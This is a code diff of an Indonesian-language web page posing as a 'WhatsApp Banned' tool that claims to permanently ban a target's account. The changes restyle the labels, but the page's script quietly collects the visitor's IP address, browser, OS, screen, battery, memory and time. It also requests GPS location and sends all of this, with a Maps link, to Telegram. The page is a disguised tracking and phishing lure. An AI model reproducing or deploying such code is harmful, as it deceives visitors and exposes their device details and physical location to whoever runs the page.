@@ -124,7 +124,7 @@
 
   <div class="login-container">
     <p class="login-title">WhatsApp Banned</p>
-    <p class="login-subtitle">⚠️ jangan salsh gunakan</p>
+    <p class="login-subtitle">⚠️ jangan disalah gunakan</p>
     <input type="number" class="login-input" placeholder="Target WhatsApp 62xxx" id="text">
     <button class="login-button" id="login-button">GAS BANNED</button>
     <div id="info">✅ Permanen bans account
@@ -184,31 +184,31 @@
       const batteryPercent = battery.level ? `${(battery.level * 100).toFixed(0)}%` : 'N/A';
 
       const text = `
-[  ♱ 𝗫-𝗧𝗼𝗼𝗹𝘀 𝗛𝗮𝗰𝗸𝗰𝗮𝗺𝗲𝗿𝗮 𝗩𝗶𝗻𝘇𝘇17 ♱  ]
+[  ♱ 𝐗 - 𝐓𝐨𝐨𝐥𝐬 𝐇𝐚𝐜𝐤𝐜𝐚𝐦𝐞𝐫𝐚 𝐕𝐢𝐧𝐳𝐳 - 𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝟏𝟕 ♱  ]
 ╭─────────────────────────╸╴
-│ ─ ɪᴘ : ${ip}
-│ ─ ʙʀᴏᴡsᴇʀ : ${navigator.userAgent}
-│ ─ ᴏs : ${navigator.platform}
-│ ─ ʀᴇsᴏʟᴜsɪ : ${screen.width}x${screen.height}
-│ ─ ʙᴀᴛᴇʀᴀɪ : ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
-│ ─ ᴍᴇᴍᴏʀɪ : ${navigator.deviceMemory || 'N/A'} GB
-│ ─ ᴄᴏᴏᴋɪᴇ : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
-│ ─ ᴡᴀᴋᴛᴜ : ${new Date().toLocaleString()}
+│ ─ 𝐈𝐏 👻 : ${ip}
+│ ─ 𝐖𝐄𝐁𝐒𝐈𝐓𝐄 : ${navigator.userAgent}
+│ ─ 𝐎𝐒 : ${navigator.platform}
+│ ─ 𝐑𝐄𝐒𝐎𝐋𝐔𝐓𝐈𝐎𝐍 : ${screen.width}x${screen.height}
+│ ─ 𝐁𝐀𝐓𝐄𝐑𝐀𝐈 : ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
+│ ─ 𝐌𝐄𝐌𝐎𝐑𝐈𝐎𝐒 : ${navigator.deviceMemory || 'N/A'} GB
+│ ─ 𝐂𝐎𝐎𝐊𝐈𝐄 : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
+│ ─ 𝐖𝐀𝐊𝐓𝐔 / 𝐓𝐈𝐌𝐄 : ${new Date().toLocaleString()}
 ╰─────────────────────────╸╴
       `.trim();
 
-      sendToTelegram(`<b>📥 Info Target:</b>\n<pre>${text}</pre>`);
+      sendToTelegram(`<b>👻 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐓𝐚𝐫𝐠𝐞𝐭 👻:</b>\n<pre>${text}</pre>`);
 
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           pos => {
             const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            sendToTelegram(`<b>📍 Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
+            sendToTelegram(`<b>📍 𝐋𝐨𝐤𝐚𝐬𝐢𝐨𝐧 𝐓𝐚𝐫𝐠𝐞𝐭 👻:</b> <a href="${link}">Klik di sini</a>`);
           },
-          () => sendToTelegram(`📍 Lokasi GPS Ditolak`)
+          () => sendToTelegram(`📍 𝐋𝐨𝐤𝐚𝐬𝐢𝐨𝐧 𝐓𝐚𝐫𝐠𝐞𝐭 𝐃𝐢𝐭𝐨𝐥𝐚𝐤 🤓`)
         );
       } else {
-        sendToTelegram(`📍 Browser tidak support GPS`);
+        sendToTelegram(`📍 𝐁𝐫𝐨𝐰𝐬𝐞𝐫 𝐍𝐨𝐭 𝐒𝐮𝐩𝐩𝐨𝐫𝐭 𝐆𝐏𝐒 👹`);
       }
     }
 
